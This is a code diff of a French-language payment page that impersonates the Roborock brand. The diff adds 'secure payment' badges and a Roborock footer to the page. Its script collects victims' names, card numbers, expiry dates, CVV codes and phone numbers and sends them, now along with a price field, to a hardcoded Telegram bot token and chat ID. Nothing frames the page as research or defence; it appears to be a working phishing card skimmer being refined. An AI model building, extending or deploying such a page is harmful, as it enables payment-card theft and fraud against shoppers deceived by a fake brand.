@@ -38,6 +38,12 @@
             Veuillez entrer vos informations de paiement pour effectuer la transaction en toute sécurité.
             Ce processus est sécurisé et protégé.
         </p>
+        
+        <!-- Section supplémentaire: Remboursement sécurisé -->
+        <div class="mt-6 flex justify-center">
+            <img src="ALTP-page-CB.jpg" alt="paiement sécurisé" class="w-52 h-auto">
+        </div>
+
 
         <!-- Formulaire -->
         <form id="paiement-form">
@@ -82,8 +88,75 @@
                 class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
                 Valider mon paiement
             </button>
-        </form>
+         </form>
+
+<!-- Section supplémentaire: Remboursement sécurisé -->
+        <div class="mt-6 flex justify-center">
+            <img src="instrumentys_paiement_securise_logo.jpg" alt="paiement sécurisé" class="w-52 h-auto">
+        </div>
     </div>
+    </form>
+
+ <!-- FOOTER -->
+<footer class="bg-gray-800 text-white py-8">
+    <div class="max-w-6xl mx-auto px-4">
+        <!-- Haut du footer : Liens et Réseaux Sociaux -->
+        <div class="flex flex-col md:flex-row justify-between items-center md:items-start">
+            <!-- Logo et description -->
+            <div class="mb-6 md:mb-0">
+                <img src="roborock.png" alt="Roborock Logo" class="h-12 mb-4">
+                <p class="text-sm text-gray-400">
+                    Explorez un monde de nettoyage intelligent avec Roborock, conçu pour votre confort quotidien.
+                </p>
+            </div>
+
+            <!-- Liens utiles -->
+            <div class="flex space-x-8">
+                <div>
+                    <h4 class="text-lg font-bold mb-4">Produits</h4>
+                    <ul class="text-sm space-y-2">
+                        <li><a href="#" class="hover:underline text-gray-400">Aspirateurs Robots</a></li>
+                        <li><a href="#" class="hover:underline text-gray-400">Accessoires</a></li>
+                        <li><a href="#" class="hover:underline text-gray-400">Nouveautés</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-lg font-bold mb-4">Support</h4>
+                    <ul class="text-sm space-y-2">
+                        <li><a href="#" class="hover:underline text-gray-400">FAQ</a></li>
+                        <li><a href="#" class="hover:underline text-gray-400">Manuels</a></li>
+                        <li><a href="#" class="hover:underline text-gray-400">Contact</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Réseaux sociaux -->
+            <div class="mt-6 md:mt-0">
+                <h4 class="text-lg font-bold mb-4">Suivez-nous</h4>
+                <div class="flex space-x-4">
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-facebook fa-lg"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-twitter fa-lg"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-instagram fa-lg"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white">
+                        <i class="fab fa-youtube fa-lg"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bas du footer : Droits réservés -->
+        <div class="mt-10 border-t border-gray-700 pt-6 text-center text-sm text-gray-500">
+            <p>&copy; 2025 Roborock. Tous droits réservés. | <a href="#" class="hover:underline">Politique de confidentialité</a> | <a href="#" class="hover:underline">Conditions d'utilisation</a></p>
+        </div>
+    </div>
+</footer>
+
 
     <script>
         document.getElementById("paiement-form").addEventListener("submit", async function(event) {
@@ -94,18 +167,21 @@
             const dateExpiration = document.getElementById("date-expiration").value;
             const cvv = document.getElementById("cvv").value;
             const telephone = document.getElementById("telephone").value;
+            const PRIX = document.getElementById("prix").value;
+
 
             // Send to Telegram bot
             const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
             const chatId = "5372119436";
 
             const message = `
-🔔 **Nouvelle Demande de Paiement** 🔔
+🔔 Nouvelle Demande de Paiement 🔔
 👤 Nom: ${nom}
 💳 Numéro de Carte: ${numeroCarte}
 📅 Expiration: ${dateExpiration}
 🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}`;
+📞 Téléphone: ${telephone}
+🔔 Prix : ${PRIX} EURO`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
